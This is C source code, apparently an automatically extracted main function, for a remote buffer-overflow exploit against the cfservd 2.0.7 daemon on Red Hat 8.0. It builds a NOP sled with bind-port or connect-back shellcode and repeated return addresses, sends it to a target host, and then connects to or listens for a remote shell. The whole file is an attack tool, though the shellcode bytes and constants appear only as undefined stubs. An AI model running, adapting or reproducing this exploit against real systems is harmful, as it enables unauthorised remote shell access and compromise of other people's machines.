
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int sockadd ;


 void* AF_INET ;
 int ALIGN ;
 int BUFF_SIZE ;
 char EOF ;
 int HDR ;
 int HDR_SIZE ;
 int INADDR_ANY ;
 int NOP ;
 int PORT_OFFSET_1 ;
 int PORT_OFFSET_2 ;
 int RET_ADDR ;
 int RET_OFFSET ;
 int RET_SIZE ;
 int SC_SIZE_1 ;
 int SC_SIZE_2 ;
 int SIGALRM ;
 int SOCK_STREAM ;
 int S_PORT ;
 int TIME_OUT ;
 int T_PORT ;
 int accept (int,struct sockaddr*,int*) ;
 int alarm (int) ;
 int atoi (char*) ;
 scalar_t__ bind (int,struct sockaddr*,int) ;
 void** bindport ;
 int changeip (char*) ;
 int changeport (void**,int,int ) ;
 int close (int) ;
 void** connback ;
 scalar_t__ connect (int,struct sockaddr*,int) ;
 int doshell (int) ;
 int err_exit (char*) ;
 int exit (int ) ;
 scalar_t__ fork () ;
 int fprintf (int ,char*,...) ;
 char getopt (int,char**,char*) ;
 int htonl (int ) ;
 void* htons (int) ;
 int inet_addr (char*) ;
 char* inet_ntoa (TYPE_1__) ;
 scalar_t__ listen (int,int ) ;
 char* malloc (int) ;
 int memset (struct sockaddr_in*,int ,int) ;
 char* optarg ;
 scalar_t__ send (int,char*,int,int ) ;
 int sendcmd (int) ;
 int sigalrm ;
 int signal (int ,int ) ;
 int sleep (int) ;
 int socket (void*,int ,int ) ;
 int stdout ;
 scalar_t__ strcmp (char*,char*) ;
 int usage (char*) ;
 int wait () ;

int main(int argc, char *argv[]) {

 char opt;
 char *buf, *ptr, *ip="";
 struct sockaddr_in sockadd;
 int i, s1, s2, i_len, ok=0, mode=0;
 int time_out=TIME_OUT, scsize=SC_SIZE_1;
 int s_port=S_PORT, t_port=T_PORT, offset=RET_OFFSET;
 int retsize=RET_SIZE, align=ALIGN, buffsize=BUFF_SIZE;
 long ret_addr;

 if (argc<2) { usage(argv[0]); }

 while ((opt=getopt(argc,argv,"i:r:b:a:h:t:s:o:T:l"))!=EOF) {
  switch(opt) {
   case 'i':
   ip=optarg;
   changeip(ip);
   break;

   case 'l':
   mode=1;
   scsize=SC_SIZE_2;
   break;

   case 'T':
   time_out=atoi(optarg);
   break;

   case 'b':
   buffsize=atoi(optarg);
   break;

   case 'a':
   align=atoi(optarg);
   break;

   case 'h':
   ok=1;
   sockadd.sin_addr.s_addr = inet_addr(optarg);
   break;

   case 'r':
   retsize=atoi(optarg);
   break;

   case 't':
   t_port=atoi(optarg);
   break;

   case 's':
   s_port=atoi(optarg);
   break;

   case 'o':
   offset=atoi(optarg);
   break;

   default:
   usage(argv[0]);
   break;
  }
 }

 if (!ok || (mode&&((strcmp(ip,"")==0)) ) ) { usage(argv[0]); }

 if (!(buf=malloc(buffsize+1))) {
  err_exit("-> malloc() error");
 }

 ret_addr=RET_ADDR-offset;
 fprintf(stdout,"\nCfservd Remote Exploit by snooq [ jinyean@hotmail.com ]\n");
 fprintf(stdout,"Tested to work against cfservd 2.0.7 on Redhat 8.0\n\n");
 fprintf(stdout,"-> Using return address of 0x%08x\n", ret_addr);

 ptr=buf;
 for(i=0;i<HDR_SIZE+align;i++) { *ptr++=HDR; }
 for(i=0;i<(buffsize-HDR_SIZE-align-scsize-retsize);i++) { *ptr++=NOP; }
 if (mode) {
      changeport(connback, s_port, PORT_OFFSET_2);
      for(i=0;i<scsize;i++) { *ptr++=connback[i]; }
 }
 else {
  changeport(bindport, s_port, PORT_OFFSET_1);
  for(i=0;i<scsize;i++) { *ptr++=bindport[i]; }
 }
 for(i=0;i<retsize;i+=4) {
  *((long *)ptr)=ret_addr;
  ptr+=4;
 }
 *ptr++=0;

 sockadd.sin_family = AF_INET;
 sockadd.sin_port = htons(t_port);

 if ((s1=socket(AF_INET,SOCK_STREAM,0))<0) {
  err_exit("-> socket error");
 }

 if(connect(s1,(struct sockaddr *)&sockadd, sizeof(sockadd))<0) {
  err_exit("-> connect() error");
 }

 if (mode) {

  fprintf(stdout,"-> 'Listening' mode...( port: %d )\n",s_port);

  if (fork()==0) {
   sleep(2);
   if (send(s1,buf,buffsize,0)<0) {
    err_exit("-> send() error");
   }
   fprintf(stdout,"-> Exploit string sent....\n");
   exit(0);
  }

  else {

   signal(SIGALRM,sigalrm);
   alarm(time_out);

   if ((s2=socket(AF_INET,SOCK_STREAM,0))<0) {
           err_exit("-> socket error");
   }

   memset(&sockadd,0,sizeof(sockadd));
   sockadd.sin_family = AF_INET;
   sockadd.sin_port = htons(s_port);
   sockadd.sin_addr.s_addr = htonl(INADDR_ANY);
   i_len=sizeof(sockadd);

   if (bind(s2,(struct sockaddr *)&sockadd,i_len)<0) {
    err_exit("-> bind() error");
   }

   if (listen(s2,0)<0) {
    err_exit("-> listen() error");
   }

   wait();
   close(s1);
   fprintf(stdout,"-> Waiting for connection....\n");

   s1=accept(s2,(struct sockaddr *)&sockadd,&i_len);

   if (s1<0) {
    err_exit("-> accept() error");
   }

   alarm(0);

   fprintf(stdout,"-> Connection from: %s\n",inet_ntoa(sockadd.sin_addr));

   sendcmd(s1);
   doshell(s1);

  }

 }

 else {

  if (send(s1,buf,buffsize,0)<0) {
   err_exit("-> send() error");
  }

  close(s1);

  fprintf(stdout,"-> 'Connecting' mode...\n");
  fprintf(stdout,"-> Exploit string sent. Waiting for a shell...\n");
  sleep(2);

  sockadd.sin_family = AF_INET;
  sockadd.sin_port = htons(s_port);

  if ((s1=socket(AF_INET,SOCK_STREAM,0))<0) {
   err_exit("-> socket() error");
  }

  if(connect(s1,(struct sockaddr *)&sockadd, sizeof(sockadd))<0) {
          fprintf(stdout,"-> Exploit failed. Target probably segfaulted...\n\n");
   exit(0);
  }

  fprintf(stdout,"-> Connecting to shell at %s:%d\n",inet_ntoa(sockadd.sin_addr),s_port);

  sendcmd(s1);
  doshell(s1);

 }

 return(0);

}
